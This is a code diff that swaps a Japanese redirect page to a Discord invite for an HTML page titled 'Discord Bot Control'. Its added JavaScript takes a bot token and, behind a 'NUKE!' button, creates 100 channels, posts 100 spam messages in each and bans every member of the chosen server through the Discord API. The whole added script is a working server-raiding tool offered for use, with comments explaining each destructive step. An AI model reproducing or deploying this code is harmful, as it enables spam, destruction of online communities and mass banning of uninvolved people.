@@ -1,47 +1,149 @@
 <!DOCTYPE html>
-<html lang="ja">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="refresh" content="3;url=https://discord.gg/junshin">
-    <meta name="robots" content="noindex, nofollow"> <!-- Google検索に出ないようにする -->
-    <title>M Plus 1s リダイレクト</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=M+PLUS+1s:wght@400;700&display=swap');
-
-        * {
-            font-family: 'M PLUS 1s', sans-serif;
-        }
-
-        body {
-            background-color: #87CEFA; /* 水色 */
-            color: orange; /* オレンジ色の文字 */
-            text-align: center;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-        }
-
-        h1 {
-            font-size: 2rem;
-        }
-
-        p {
-            font-size: 1.2rem;
-        }
-
-        a {
-            color: orange;
-            font-weight: bold;
-            text-decoration: none;
-        }
-    </style>
+<title>Discord Bot Control</title>
 </head>
 <body>
-    <h1>リダイレクト中…</h1>
-    <p>自動的に <a href="https://discord.gg/junshin">Discordサーバー</a> へ移動します。</p>
-    <p>リダイレクトされない場合は、<a href="https://discord.gg/junshin">こちらをクリック</a>してください。</p>
+  <h1>Discord Bot Control</h1>
+
+  <label for="token">Token:</label>
+  <input type="text" id="token" name="token"><br><br>
+
+  <label for="server">Server:</label>
+  <select id="server" name="server">
+    </select><br><br>
+
+  <label for="message">Message:</label>
+  <input type="text" id="message" name="message"><br><br>
+
+  <label for="channel">Channel Name:</label>
+  <input type="text" id="channel" name="channel"><br><br>
+
+  <button onclick="nuke()">NUKE!</button>
+
+  <script>
+    // Discord Botのトークン
+    let token = "";
+
+    // サーバーリスト
+    let servers = [];
+
+    // サーバー選択
+    let selectedServer = null;
+
+    // HTML要素の取得
+    const tokenInput = document.getElementById("token");
+    const serverSelect = document.getElementById("server");
+    const messageInput = document.getElementById("message");
+    const channelInput = document.getElementById("channel");
+
+    // トークンが入力されたら処理を実行
+    tokenInput.addEventListener("change", () => {
+      token = tokenInput.value;
+      if (token) {
+        // Discord APIに接続してサーバーリストを取得
+        getServers();
+      }
+    });
+
+    // サーバーリストを取得
+    async function getServers() {
+      // Discord APIに接続
+      const response = await fetch("https://discord.com/api/v9/users/@me/guilds", {
+        headers: {
+          Authorization: `Bot ${token}`
+        }
+      });
+
+      // サーバーリストを取得
+      servers = await response.json();
+
+      // サーバーリストをドロップダウンに追加
+      servers.forEach(server => {
+        const option = document.createElement("option");
+        option.value = server.id;
+        option.text = server.name;
+        serverSelect.appendChild(option);
+      });
+
+      // 最初のサーバーを選択
+      selectedServer = servers[0];
+    }
+
+    // NUKE処理
+    async function nuke() {
+      if (!selectedServer) {
+        alert("サーバーを選択してください。");
+        return;
+      }
+
+      const message = messageInput.value;
+      const channelName = channelInput.value;
+
+      // チャンネルを大量に作成し、メッセージを送信
+      for (let i = 0; i < 100; i++) {
+        const channel = await createChannel(channelName + i);
+        for (let j = 0; j < 100; j++) {
+          await sendMessage(channel.id, message);
+        }
+      }
+
+      // サーバーにいる全員をBAN
+      const members = await getMembers(selectedServer.id);
+      for (const member of members) {
+        await banMember(selectedServer.id, member.user.id);
+      }
+    }
+
+    // チャンネルを作成
+    async function createChannel(name) {
+      const response = await fetch(`https://discord.com/api/v9/guilds/${selectedServer.id}/channels`, {
+        method: "POST",
+        headers: {
+          Authorization: `Bot ${token}`,
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          name: name,
+          type: 0 // テキストチャンネル
+        })
+      });
+      return await response.json();
+    }
+
+    // メッセージを送信
+    async function sendMessage(channelId, message) {
+      await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
+        method: "POST",
+        headers: {
+          Authorization: `Bot ${token}`,
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          content: message
+        })
+      });
+    }
+
+    // サーバーのメンバーリストを取得
+    async function getMembers(serverId) {
+      const response = await fetch(`https://discord.com/api/v9/guilds/${serverId}/members?limit=1000`, {
+        headers: {
+          Authorization: `Bot ${token}`
+        }
+      });
+      return await response.json();
+    }
+
+    // メンバーをBAN
+    async function banMember(serverId, userId) {
+      await fetch(`https://discord.com/api/v9/guilds/${serverId}/bans/${userId}`, {
+        method: "PUT",
+        headers: {
+          Authorization: `Bot ${token}`
+        }
+      });
+    }
+  </script>
 </body>
 </html>
